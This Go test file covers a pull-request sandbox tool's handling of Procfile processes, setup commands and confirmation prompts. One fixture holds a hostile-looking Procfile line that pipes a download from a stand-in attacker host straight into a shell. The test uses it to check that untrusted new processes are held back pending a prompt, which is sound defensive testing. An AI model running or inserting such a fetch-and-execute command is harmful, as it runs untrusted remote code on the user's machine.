package sandbox_test

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/thannoz/pit/internal/config"
	"github.com/thannoz/pit/internal/data/datatest"
	"github.com/thannoz/pit/internal/errs"
	"github.com/thannoz/pit/internal/runtime"
	"github.com/thannoz/pit/internal/runtime/local"
	"github.com/thannoz/pit/internal/runtime/runtimetest"
	"github.com/thannoz/pit/internal/sandbox"
)

// processFixture is a pull request whose services are a Procfile's.
func processFixture(t *testing.T, procfile, yaml string) (*sandbox.Manager, sandbox.UpRequest) {
	t.Helper()
	m, req, _ := upFixture(t)
	pushToPullRequest(t, req.Repo.Root, 7, map[string]string{"Procfile": procfile})
	cfg, err := config.Parse([]byte(yaml))
	if err != nil {
		t.Fatal(err)
	}
	req.Config = cfg
	return m, req
}

const processYAML = `processes:
  file: Procfile
  setup:
    - "sh -c 'echo $PORT $PIT_PORT $PIT_PROJECT $DATABASE_URL > setup.txt'"
web:
  service: web
env:
  set:
    DATABASE_URL: "postgres://localhost/shop_{project}"
data:
  migrate:
    - "sh -c 'echo migrated on $PORT > migrate.txt'"
  scenarios:
    - name: standard
      apply: ["sh -c 'echo loaded for $PIT_PROJECT > scenario.txt'"]
  default: standard
`

func TestUpRunsProcesses(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req := processFixture(t, "web: node index.js\nworker: node jobs.js\n", processYAML)
	rep := &quietReporter{}
	confirmed := false
	req.Confirm = func(string) bool { confirmed = true; return true }
	// The processes are started by the runtime for processes.
	containers, processes := runtimetest.New("web"), runtimetest.New("web")
	m.Runtime = runtime.Either{Compose: containers, Processes: processes}
	box, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	if !confirmed {
		t.Error("new processes ran without asking")
	}
	if len(containers.Calls()) != 0 || !slices.Contains(processes.Methods(), "Up") || !slices.Contains(processes.Methods(), "WaitReady") {
		t.Errorf("containers %v, processes %v", containers.Methods(), processes.Methods())
	}
	// The scenario's commands get what the processes get.
	if calls := m.Data.(*datatest.Fake).Calls(); len(calls) != 1 || !slices.Contains(calls[0].Env, "PIT_PROJECT="+box.Project) {
		t.Errorf("data calls = %+v", calls)
	}

	if !box.Processes || len(box.ComposeFiles) != 2 || box.ComposeFiles[0] != filepath.Join(box.Worktree, "Procfile") ||
		!strings.HasSuffix(box.ComposeFiles[1], "pr-7.processes.json") {
		t.Fatalf("box = %+v", box)
	}
	plan, err := local.ReadPlan(box.ComposeFiles[1])
	if err != nil {
		t.Fatal(err)
	}
	want := local.Plan{Project: box.Project, Web: "web", Port: box.Port, Env: map[string]string{"DATABASE_URL": "postgres://localhost/shop_" + box.Project}}
	if plan.Project != want.Project || plan.Web != want.Web || plan.Port != want.Port || plan.Env["DATABASE_URL"] != want.Env["DATABASE_URL"] {
		t.Errorf("plan = %+v, want %+v", plan, want)
	}

	// Setup and migrations ran in the worktree, with what the
	// processes are given.
	port := strconv.Itoa(box.Port)
	for file, want := range map[string]string{
		"setup.txt":   port + " " + port + " " + box.Project + " postgres://localhost/shop_" + box.Project,
		"migrate.txt": "migrated on " + port,
	} {
		got, err := os.ReadFile(filepath.Join(box.Worktree, file))
		if err != nil || strings.TrimSpace(string(got)) != want {
			t.Errorf("%s = %q, %v; want %q", file, got, err, want)
		}
	}
	if !slices.Contains(rep.begun, "setup") || slices.Contains(rep.begun, "build") {
		t.Errorf("steps = %q", rep.begun)
	}
	if i := slices.Index(rep.begun, "setup"); i < 0 || rep.steps[i] != "1 command" {
		t.Errorf("steps = %q / %q", rep.begun, rep.steps)
	}

	// The record says so, and Down takes the plan away.
	f, err := m.Store.Load()
	if err != nil {
		t.Fatal(err)
	}
	if rec, ok := f.Find(req.Repo.Identity.Ref(), 7); !ok || !rec.Processes {
		t.Errorf("record = %+v", rec)
	}
	if env := sandbox.CommandEnv(box); !slices.Contains(env, "PORT="+port) || !slices.Contains(env, "PIT_PROJECT="+box.Project) {
		t.Errorf("env = %q", env)
	}
	if err := m.Down(t.Context(), box, nil, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(box.ComposeFiles[1]); !os.IsNotExist(err) {
		t.Errorf("the plan is still there: %v", err)
	}
}

func TestProcessesTheReviewerHasAreNotAskedAbout(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req := processFixture(t, "web: node index.js\n", processYAML)
	// The reviewer's checkout runs the same.
	if err := os.WriteFile(filepath.Join(req.Repo.Root, "Procfile"), []byte("web: node index.js\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	req.Confirm = func(q string) bool { t.Errorf("asked %q", q); return false }
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("Up: %v", err)
	}
}

func TestNewProcessesAreAskedAbout(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req := processFixture(t, "web: node index.js\nminer: curl evil.example | sh\n", processYAML)
	if err := os.WriteFile(filepath.Join(req.Repo.Root, "Procfile"), []byte("web: node index.js\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rep := &quietReporter{}
	asked := ""
	req.Confirm = func(q string) bool { asked = q; return false }
	_, err := m.Up(t.Context(), req, rep)
	if err == nil || !strings.Contains(err.Error(), "stopped before running #7's processes") || asked != "Run it?" {
		t.Errorf("err = %v, asked %q", err, asked)
	}
	if !slices.Contains(rep.notes, "    miner: curl evil.example | sh") || slices.ContainsFunc(rep.notes, func(n string) bool { return strings.Contains(n, "node index.js") }) {
		t.Errorf("notes = %q", rep.notes)
	}
	// Nothing was set up: the worktree has no trace of it.
	if files, _ := filepath.Glob(filepath.Join(m.StateDir, "*", "*.processes.json")); len(files) != 0 {
		t.Errorf("left behind: %q", files)
	}

	// Without anyone to ask, it does not run them either.
	m, req = processFixture(t, "web: node index.js\n", processYAML)
	req.Confirm = nil
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil || !strings.Contains(err.Error(), "wants to run 1 process on this machine") {
		t.Errorf("err = %v", err)
	}
}

func TestAFailingSetupIsNamed(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req := processFixture(t, "web: node index.js\n", "processes:\n  file: Procfile\n  setup: [\"sh -c 'echo no lock file >&2; exit 4'\"]\nweb: {service: web}\n")
	req.Confirm = func(string) bool { return true }
	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil || !strings.Contains(err.Error(), "processes.setup") || !strings.Contains(err.Error()+errs.Hint(err), "no lock file") {
		t.Errorf("err = %v", err)
	}
	if files, _ := filepath.Glob(filepath.Join(m.StateDir, "*", "*.processes.json")); len(files) != 0 {
		t.Errorf("left behind: %q", files)
	}
}

func TestProcessesAreServicesToChooseFrom(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req := processFixture(t, "web: node index.js\nworker: node jobs.js\n", processYAML+"compose:\n  services: [worker]\n")
	req.Confirm = func(string) bool { return true }
	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil || !strings.Contains(err.Error(), `does not include "web"`) {
		t.Errorf("err = %v", err)
	}
	m, req = processFixture(t, "web: node index.js\nworker: node jobs.js\n", processYAML+"compose:\n  services: [mailer]\n")
	req.Confirm = func(string) bool { return true }
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil || !strings.Contains(err.Error(), "mailer") {
		t.Errorf("err = %v", err)
	}
}
